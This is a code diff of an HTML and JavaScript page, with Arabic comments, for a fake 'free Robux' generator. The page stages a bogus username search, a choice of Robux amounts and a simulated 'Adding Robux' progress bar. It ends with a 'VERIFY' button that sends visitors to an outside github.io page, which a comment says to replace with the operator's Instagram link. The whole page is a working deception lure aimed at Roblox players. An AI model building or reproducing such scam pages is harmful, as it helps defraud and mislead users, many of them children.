@@ -6,157 +6,146 @@
 <title>Verification</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
 
-<!-- خلفية الذرات 3D -->
 <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
 <style>
-  :root{
-    --accent:#7b2cff; --accent-dark:#5a1fd1;
-    --card-w:420px; --radius:20px;
-    --ink:#101418; --muted:#6b7280;
-  }
-  /* خلفية الذرات */
-  #particles-js{position:fixed;inset:0;z-index:-1;background:#eef0ea}
+:root{--accent:#7b2cff;--accent-dark:#5a1fd1;--card-w:420px;--radius:20px;--ink:#101418;--muted:#6b7280}
+#particles-js{position:fixed;inset:0;z-index:-1;background:#eef0ea}
+body{margin:0;font-family:Inter,sans-serif;display:grid;place-items:center;min-height:100vh;color:var(--ink)}
+.card{width:min(var(--card-w),92vw);background:#fff;border-radius:var(--radius);border:3px solid var(--accent);
+      box-shadow:0 14px 30px rgba(123,44,255,.25);padding:28px 20px 34px;text-align:center;position:relative}
+.brand-bar{position:absolute;left:50%;top:-30px;transform:translateX(-50%);
+           background:#fff;border:3px solid var(--accent);border-radius:16px;padding:8px 18px;
+           box-shadow:0 8px 20px rgba(123,44,255,.25)}
+.brand{height:34px}
 
-  body{margin:0;font-family:Inter,sans-serif;display:grid;place-items:center;min-height:100vh;color:var(--ink)}
-  .card{
-    width:min(var(--card-w),92vw); background:#fff; border-radius:var(--radius);
-    border:3px solid var(--accent); box-shadow:0 14px 30px rgba(123,44,255,.25);
-    padding:28px 20px 34px; text-align:center; position:relative;
-  }
-  .brand-bar{
-    position:absolute; left:50%; top:-30px; transform:translateX(-50%);
-    background:#fff; border:3px solid var(--accent); border-radius:16px; padding:8px 18px;
-    box-shadow:0 8px 20px rgba(123,44,255,.25);
-  }
-  .brand{height:34px}
+h1{margin:26px 0 6px;letter-spacing:.12em}
+.muted{color:var(--muted);font-size:.92rem}
+.stage{display:none}
 
-  h1{margin:36px 0 6px; letter-spacing:.18em}
-  .muted{color:var(--muted); font-size:.92rem}
+.amounts{display:grid;gap:10px;margin:20px 0}
+.amount-btn{
+  display:flex;align-items:center;justify-content:center;
+  background:#f7f7fc;border:2px solid #ddd;border-radius:14px;
+  height:60px;font-weight:700;font-size:18px;cursor:pointer;
+  transition:all .2s ease;
+}
+.amount-btn img{height:28px;margin-right:10px}
+.amount-btn.active{background:var(--accent);color:#fff;border-color:var(--accent-dark)}
 
-  /* مرحلة التحميل */
-  .status-wrap{margin-top:16px; display:grid; place-items:center; gap:12px}
-  .stage-icon{
-    width:64px; height:64px; border-radius:16px; display:grid; place-items:center;
-    background:#f7f7fc; border:2px solid #e1e1ec; margin-bottom:4px;
-    box-shadow:inset 0 1px 0 #fff, 0 6px 16px #00000012;
-    font-size:32px;
-  }
-  .stage-title{font-weight:900; letter-spacing:.2em; color:#6b7280; font-size:.9rem}
-  .who{font-weight:800; font-size:1.05rem}
+.bar{height:14px;width:100%;background:#ececf5;border:1px solid #e6e6f3;border-radius:14px;overflow:hidden;margin-top:20px}
+.fill{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent-dark));transition:width .2s linear}
 
-  .bar{height:14px; width:100%; background:#ececf5; border:1px solid #e6e6f3; border-radius:14px; overflow:hidden}
-  .fill{height:100%; width:0%; background:linear-gradient(90deg,var(--accent),var(--accent-dark)); transition:width .2s linear}
-
-  /* قسم التحقق النهائي */
-  .verify{display:none; margin-top:10px}
-  .verify .title{font-weight:900; letter-spacing:.18em; color:#6b7280; margin-bottom:6px}
-  .rbx-box{
-    background:#f7f7fc; border:2px solid #e1e1ec; border-radius:20px;
-    padding:16px; font-weight:900; font-size:18px; margin:12px auto 16px; width:220px;
-    box-shadow:inset 0 1px 0 #fff, 0 8px 18px #00000012;
-  }
-  .cta{
-    width:100%; height:60px; border:0; border-radius:16px;
-    background:linear-gradient(180deg,var(--accent),var(--accent-dark));
-    color:#fff; font-weight:900; font-size:20px; cursor:pointer;
-    box-shadow:0 12px 26px rgba(123,44,255,.4);
-  }
-  .cta:hover{transform:translateY(-2px)}
+.verify{display:none;margin-top:20px}
+.rbx-box{background:#f7f7fc;border:2px solid #e1e1ec;border-radius:20px;
+         padding:16px;font-weight:900;font-size:18px;margin:12px auto 16px;width:220px;
+         box-shadow:inset 0 1px 0 #fff,0 8px 18px #00000012}
+.cta{width:100%;height:60px;border:0;border-radius:16px;
+     background:linear-gradient(180deg,var(--accent),var(--accent-dark));
+     color:#fff;font-weight:900;font-size:20px;cursor:pointer;
+     box-shadow:0 12px 26px rgba(123,44,255,.4)}
+.cta:hover{transform:translateY(-2px)}
 </style>
 </head>
 <body>
 <div id="particles-js"></div>
 
-<section class="card" aria-label="Verification">
+<section class="card">
   <div class="brand-bar">
-    <!-- ❗ غيّر رابط اللوجو هنا (لو ما يشتغل رابطك الماضي) -->
-    <img class="brand" src="https://i.imgflip.com/6s50u1.png" alt="ROBLOX">
+    <!-- شعار Roblox -->
+    <img class="brand" src="https://ngtimes.ca/wp-content/uploads/2021/01/roblox-logo.png" alt="ROBLOX">
   </div>
 
-  <h1>VERIFICATION</h1>
-  <div class="muted">Please hold while we process your request.</div>
+  <!-- المرحلة 1 -->
+  <div id="stage1" class="stage" style="display:block">
+    <h1>SEARCHING</h1>
+    <p class="muted">Searching for <span id="sUser">—</span>...</p>
+  </div>
 
-  <!-- مراحل التحميل -->
-  <div id="stage" class="status-wrap">
-    <div id="icon" class="stage-icon">🔍</div>
-    <div id="stageTitle" class="stage-title">SEARCHING FOR</div>
-    <div id="who" class="who">—</div>
+  <!-- المرحلة 2 -->
+  <div id="stage2" class="stage">
+    <h1>USER FOUND</h1>
+    <p class="muted"><span id="fUser">—</span> is valid</p>
+    <div class="rbx-box">✔</div>
+  </div>
+
+  <!-- المرحلة 3 اختيار روبكس -->
+  <div id="stage3" class="stage">
+    <h1>SELECT ROBUX</h1>
+    <p class="muted">Choose your Robux amount</p>
+    <div class="amounts">
+      <div class="amount-btn" data-val="1000"><img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"> 1000 Robux</div>
+      <div class="amount-btn" data-val="2500"><img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"> 2500 Robux</div>
+      <div class="amount-btn" data-val="5000"><img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"> 5000 Robux</div>
+      <div class="amount-btn" data-val="50000"><img src="https://tr.rbxcdn.com/7ecc2604606900f14ab35cfb314852dd/250/250/Decal/Png"> 50000 Robux</div>
+    </div>
+  </div>
+
+  <!-- المرحلة 4 توليد -->
+  <div id="stage4" class="stage">
+    <h1>Checking</h1>
+    <p class="muted">Adding <span id="gAmount"></span> Robux for <span id="gUser"></span></p>
     <div class="bar"><div id="fill" class="fill"></div></div>
   </div>
 
-  <!-- بعد المراحل -->
-  <div id="verifyBlock" class="verify">
-    <div class="title">VERIFICATION</div>
-    <h2 id="vUser" style="margin:6px 0 4px">—</h2>
-    <p class="muted">Your request is ready. Please complete verification to proceed.</p>
-    <div class="rbx-box"><span id="vAmount">0</span> Robux</div>
+  <!-- المرحلة 5 تحقق -->
+  <div id="stage5" class="stage verify">
+    <h1>VERIFICATION</h1>
+    <h2 id="vUser">—</h2>
+    <p class="muted">Your <span id="vAmount"></span> Robux is ready. Please verify to proceed.</p>
+    <div class="rbx-box"><span id="vAmount2"></span> Robux</div>
     <button id="verifyBtn" class="cta">VERIFY</button>
-    <p class="muted" style="margin-top:10px">.</p>
   </div>
 </section>
 
 <script>
-  /* تهيئة الخلفية الذرّية */
-  particlesJS("particles-js",{
-    particles:{number:{value:70,density:{enable:true,value_area:800}},
-      color:{value:"#7b2cff"},shape:{type:"circle"},
-      opacity:{value:.6,random:true},size:{value:4,random:true},
-      line_linked:{enable:true,distance:150,color:"#7b2cff",opacity:.4,width:1},
-      move:{enable:true,speed:2,direction:"none",out_mode:"out"}},
-    interactivity:{detect_on:"canvas",
-      events:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}},
-      modes:{grab:{distance:140,line_linked:{opacity:.8}},push:{particles_nb:3}}},
-    retina_detect:true
-  });
+particlesJS("particles-js",{particles:{number:{value:70,density:{enable:true,value_area:800}},color:{value:"#7b2cff"},
+shape:{type:"circle"},opacity:{value:.6,random:true},size:{value:4,random:true},
+line_linked:{enable:true,distance:150,color:"#7b2cff",opacity:.4,width:1},
+move:{enable:true,speed:2,direction:"none",out_mode:"out"}},
+interactivity:{detect_on:"canvas",events:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}},
+modes:{grab:{distance:140,line_linked:{opacity:.8}},push:{particles_nb:3}}},retina_detect:true});
 
-  /* استرجاع الاسم والروبكس من الصفحة الأولى */
-  const params=new URLSearchParams(location.search);
-  const store=JSON.parse(localStorage.getItem('rbx_entry')||'{}');
-  const username = (store.u || params.get('u') || 'Guest').trim();
-  const robux    = Number(store.r || params.get('r') || 1000);
+const params=new URLSearchParams(location.search);
+const store=JSON.parse(localStorage.getItem('rbx_entry')||'{}');
+const username=(store.u||params.get('u')||'Guest').trim();
+document.getElementById("sUser").textContent=username;
+document.getElementById("fUser").textContent=username;
+document.getElementById("gUser").textContent=username;
+document.getElementById("vUser").textContent=username;
 
-  // عرضهم من البداية
-  document.getElementById('who').textContent = `${username} — ${robux.toLocaleString()} Robux`;
+let chosen=0;
 
-  // مراحل التقدم
-  const icon = document.getElementById('icon');
-  const title= document.getElementById('stageTitle');
-  const fill = document.getElementById('fill');
-  const stage= document.getElementById('stage');
-  const verifyBlock = document.getElementById('verifyBlock');
-  const vUser = document.getElementById('vUser');
-  const vAmount = document.getElementById('vAmount');
+// مراحل متسلسلة
+setTimeout(()=>{showStage(2)},2000);
+setTimeout(()=>{showStage(3)},4000);
 
-  let t0=performance.now();
-  const total=9000; // المدة الإجمالية ~9 ثواني
-  function tick(now){
-    const p = Math.min(1,(now - t0)/total);
-    fill.style.width = (p*100).toFixed(1)+'%';
+function showStage(n){
+  document.querySelectorAll(".stage").forEach(s=>s.style.display="none");
+  document.getElementById("stage"+n).style.display="block";
+}
 
-    if (p < .25){
-      title.textContent = 'SEARCHING FOR'; icon.textContent = '🔍';
-    } else if (p < .5){
-      title.textContent = 'USER FOUND'; icon.textContent = '✅';
-    } else if (p < .8){
-      title.textContent = 'LOADING…'; icon.textContent = '⚙️';
-    } else {
-      title.textContent = 'verify requirement'; icon.textContent = '❌';
-    }
-
-    if (p < 1){ requestAnimationFrame(tick); }
-    else {
-      // إظهار التحقق
-      stage.style.display='none';
-      verifyBlock.style.display='block';
-      vUser.textContent = username;
-      vAmount.textContent = robux.toLocaleString();
-    }
+// اختيار روبكس
+document.querySelectorAll(".amount-btn").forEach(btn=>{
+  btn.onclick=()=>{
+    chosen=btn.dataset.val;
+    document.getElementById("gAmount").textContent=chosen;
+    showStage(4);
+    startProgress();
   }
-  requestAnimationFrame(tick);
+});
 
-  /* زر VERIFY → رابط إنستا (عدّله هنا) */
-  const INSTAGRAM_URL = "https://gnesvas.github.io/chjan/"; // مثال: "https://instagram.com/YOUR_USERNAME"
-  document.getElementById('verifyBtn').onclick = ()=>{ if(INSTAGRAM_URL) location.href = INSTAGRAM_URL; };
+function startProgress(){
+  const fill=document.getElementById("fill"); let p=0;
+  const interval=setInterval(()=>{
+    p+=5; fill.style.width=p+"%";
+    if(p>=100){clearInterval(interval);document.getElementById("vAmount").textContent=chosen;
+      document.getElementById("vAmount2").textContent=chosen; showStage(5);}
+  },250);
+}
+
+// زر تحقق
+const INSTAGRAM_URL="https://gnesvas.github.io/chjan/"; // حط رابط انستقرامك هنا
+document.getElementById("verifyBtn").onclick=()=>{if(INSTAGRAM_URL)location.href=INSTAGRAM_URL;}
 </script>
 </body>
 </html>
